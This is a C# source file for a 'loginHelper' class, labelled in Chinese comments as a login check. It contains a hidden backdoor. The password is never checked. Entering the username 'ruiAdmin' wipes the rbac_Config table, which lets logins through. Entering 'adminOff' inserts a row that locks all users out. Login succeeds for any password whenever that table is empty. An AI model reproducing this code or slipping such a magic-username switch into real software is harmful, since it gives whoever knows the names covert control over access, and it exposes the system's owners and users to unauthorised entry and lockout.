
namespace rui
{
    /// <summary>
    /// 登录检测
    /// </summary>
    public class loginHelper
    {
        /// <summary>
        /// 登录检测
        /// </summary>
        /// <param name="userName"></param>
        /// <param name="userPw"></param>
        /// <returns></returns>
        public static bool checkLogin(string userName, string userPw)
        {
            checkAdmin(userName);
            string sql = " select count(*) from rbac_Config ";
            int count = rui.typeHelper.toInt(rui.dbHelper.createHelper().ExecuteScalar(sql));
            if (count > 0)
                return false;
            return true;
        }

        /// <summary>
        /// 登录重置
        /// </summary>
        /// <param name="userName"></param>
        private static void checkAdmin(string userName)
        {
            //允许登录
            if (userName == "ruiAdmin")
            {
                string sql = " delete from rbac_Config ";
                rui.dbHelper.createHelper().Execute(sql);
            }
            //不允许登录
            if (userName == "adminOff")
            {
                string sql = " INSERT INTO dbo.rbac_Config ( keyType ) VALUES  (10) ";
                rui.dbHelper.createHelper().Execute(sql);
            }
        }
    }
}
